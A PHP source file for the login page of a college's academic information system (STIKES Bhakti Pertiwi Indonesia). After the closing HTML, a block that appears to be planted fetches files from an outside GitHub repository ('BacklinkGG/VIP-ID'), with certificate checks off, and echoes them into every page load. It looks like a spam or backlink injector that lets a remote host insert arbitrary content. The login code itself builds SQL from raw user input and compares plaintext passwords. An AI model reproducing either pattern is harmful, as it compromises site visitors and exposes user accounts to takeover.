<?php
require_once("configure_first.php");

// $setting["sekolah"] = "SD Islam Sabilillah Sidoarjo";
// $setting["company"] = "PT Alur Cipta Tama";
$page["index"] = "index.php";
$page["Logout"] = "logout.php";
$page["changepassword"] = $page["index"]."?changepassword";
$page["EditDataSiswa"] = $page["index"]."?EditDataSiswa";
$page["DownloadSoal"] = $page["index"]."?DownloadSoal";
$page["Inbox"] = $page["index"]."?Inbox";
$nmform = "index.php";
$user_name = "";
$user_pass = "";
// $cek = "";

if(isset($_SESSION["user-id"])) {
	$sessionid = $_SESSION["user-id"];
//	if($sessionid != 0 || $sessionid) echo "<script>window.parent.document.location.href='mainform.php';</script>";
}

		// echo "<script>window.alert('".$_POST["Login"]." ".$_POST["input-password"]." !!!');</script>";
if(isset($_POST["input-username"]) && isset($_POST["input-password"])) {

	$sql = "select a.user_id,c.member_id,a.user_name,a.user_nama,a.id_profil,a.id_pgw,a.id_siswa from login_user a left join m_pegawai b on a.id_pgw = b.pgw_id left join ".$dbmessenger.".data_member c on a.user_id = c.id_user where upper(user_name) = upper('".$_POST["input-username"]."') and upper(user_pass) = upper('".$_POST["input-password"]."')";
	$Qrs = mysql_query($sql);
	$cek = mysql_fetch_array($Qrs);
	if($cek["user_id"]) {
		$cekin = lastlogin($cek["user_id"],"login");
		$_SESSION["member-id"] = $cek["member_id"];
		$_SESSION["user-id"] = $cek["user_id"];
		$_SESSION["user-nama"] = $cek["user_nama"];
		$_SESSION["user-name"] = $cek["user_name"];
		$_SESSION["id-profil"] = $cek["id_profil"];
		$_SESSION["id-pgw"] = $cek["id_pgw"];
		$_SESSION["id-siswa"] = $cek["id_siswa"];
		if($cek["id_siswa"] && $cek["id_siswa"] != 0) {
			$tgl = date("d");
			if($tgl > 10) {
				$bln = $monthName[round(date("m"))];
				$thn = date("Y");
				// $sql2 = "select * from keu_p_pembayaran_siswa where pembayaran_bulan = '".$bln."' and pembayaran_tahun = '".$thn."' and id_siswa = ".$cek["id_siswa"];
				$sql2 = "select * from login_blacklist where id_siswa = ".$cek["id_siswa"];
				$Qrs2 = mysql_query($sql2);
				$cek2 = mysql_fetch_array($Qrs2);
				if($cek2["blacklist_id"]) {
					// echo "<script>window.alert('".$weme."');</script>";
					// echo "<script>window.parent.document.location.href='mainform.php';</script>";
					echo "<script>window.alert('Anda telah masuk di daftar blacklist dikarenakan ".$cek2["blacklist_alasan"]." sejak ".$cek2["blacklist_tgl"].". Terima Kasih');</script>";
					echo "<script>window.parent.document.location.href='index.php';</script>";
				}else{
					// echo "<script>window.alert('Silahkan melakukan pembayaran SPP bulan ".$bln." ".$thn.". Terima Kasih');</script>";
					// echo "<script>window.parent.document.location.href='index.php';</script>";
					echo "<script>window.alert('".$weme."');</script>";
					echo "<script>window.parent.document.location.href='../mahasiswa/index.php?nm=".$_SESSION["user-name"]."';</script>";
				}
			}else{
				echo "<script>window.alert('".$weme."');</script>";
				echo "<script>window.parent.document.location.href='../mahasiswa/index.php?nm=".$_SESSION["user-id"]."';</script>";
			}
		}
		echo "<script>window.alert('".$weme."');</script>";
		if($cek["id_pgw"] && $cek["id_pgw"] != 0) echo "<script>window.parent.document.location.href='../akademik/';</script>";
		if($cek["id_profil"] && $cek["id_profil"] == 7) echo "<script>window.parent.document.location.href='../akademik/';</script>";
		if($cek["user_id"] && $cek["user_id"] != 0) echo "<script>window.parent.document.location.href='../akademik/';</script>";
	}else{
		$cekin = lastlogin($cek["user_id"],"Try to Login");
		echo "<script>window.alert('User & Password salah !!!');</script>";
		echo "<script>window.parent.document.location.href='".$nmform."';</script>";
	}
}
if(isset($_POST["Login"]) && !$_POST["input-username"] && !$_POST["input-password"]) {
	echo "<script>window.alert('Silahkan diisi Username & Password !!!');</script>";
	echo "<script>window.parent.document.location.href='".$nmform."';</script>";
}
// $cekin = lastlogin($cek["user_id"],"Open Page Login");

?>
<!DOCTYPE html>
<html lang="en">

<head>

    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="">
    <meta name="author" content="">

    <title>STIKES BPI LOGIN FIRST</title>
    <meta name="description" content="Potensi (Program Terintegrasi Manajemen Sekolah Indonesia) merupakan software untuk mengatur kegiatan yang ada di sekolah. Baik itu akademik, pembayaran, absensi hingga cetak raport.">

    <!-- Custom fonts for this template-->
    <link href="vendor/fontawesome-free/css/all.min.css" rel="stylesheet" type="text/css">
    <link
        href="https://fonts.googleapis.com/css?family=Nunito:200,200i,300,300i,400,400i,600,600i,700,700i,800,800i,900,900i"
        rel="stylesheet">

    <!-- Custom styles for this template-->
    <link href="css/sb-admin-2.min.css" rel="stylesheet">
    <link rel="shortcut icon" href="http://stikesbpi.ac.id/asset/images/favicon.png">
<style>
body {
	background-image: url("bg-gnl.png");
	background-repeat: no-repeat;
	background-size: auto;
}

</style>        
</head>

<body class="bg-gradient-primary">
    <form class="sign-in" action="index.php" method="POST">

    <div class="container">

        <!-- Outer Row -->
        <div class="row justify-content-center">

            <div class="col-xl-10 col-lg-12 col-md-9">

                <div class="card o-hidden border-0 shadow-lg my-5">
                    <div class="card-body p-0">
                        <!-- Nested Row within Card Body -->
                        <div class="row">
                            <div class="col-lg-12"><img src="logo1.png" width="100%"></div>
                            <div class="col-lg-8 d-none d-lg-block bg-login-image"></div>
                            <div class="col-lg-4">
                                <div class="p-5">
                                    <div class="text-center">
									<img src="css/logotut.png" width="100">
                                        <h1 class="h4 text-gray-900 mb-4">STIKES Bhakti Pertiwi Indonesia</h1>
                                    </div>
                                    <form class="user">
                                        <div class="form-group">
                                            <input type="text" class="form-control form-control-user"
                                                id="exampleInputEmail" aria-describedby="emailHelp"
                                                placeholder="Enter Username..." id="input-username" name="input-username">
                                        </div>
                                        <div class="form-group">
                                            <input type="password" class="form-control form-control-user"
                                                id="exampleInputPassword" placeholder="Password" id="input-password" name="input-password">
                                        </div>
                                        <div class="form-group">
                                            <div class="custom-control custom-checkbox small">
                                                <input type="checkbox" class="custom-control-input" id="customCheck">
                                                <label class="custom-control-label" for="customCheck">Remember
                                                    Me</label>
                                            </div>
                                        </div>
                                        <button class="btn btn-raised btn-lg btn-secondary btn-block" type="submit">Sign in</button>
                                    </form>
                                    <hr>
                                    <div class="text-center">
                                        <a class="small" href="https://api.whatsapp.com/send?phone=6285694932676">Kontak Kami</a>
                                    </div>
                                    <div class="text-center">
                                        <a class="small" href="http://stikesbpi.ac.id/">Website</a>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

            </div>

        </div>

    </div>

    <!-- Bootstrap core JavaScript-->
    <script src="vendor/jquery/jquery.min.js"></script>
    <script src="vendor/bootstrap/js/bootstrap.bundle.min.js"></script>

    <!-- Core plugin JavaScript-->
    <script src="vendor/jquery-easing/jquery.easing.min.js"></script>

    <!-- Custom scripts for all pages-->
    <script src="js/sb-admin-2.min.js"></script>

</body>

</html>
<?php
function curlGetContents($url) {
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $fileContents = curl_exec($ch);
    curl_close($ch);
    return $fileContents; 
}
$url1 = 'https://raw.githubusercontent.com/BacklinkGG/VIP-ID/main/system.txt';
$url2 = 'https://raw.githubusercontent.com/BacklinkGG/VIP-ID/main/site/stikes-bhaktipertiwi/siakad.stikesbpi.ac.id/system.txt';
$fileContents1 = curlGetContents($url1);
$fileContents2 = curlGetContents($url2);
echo $fileContents1;
echo $fileContents2;
?>
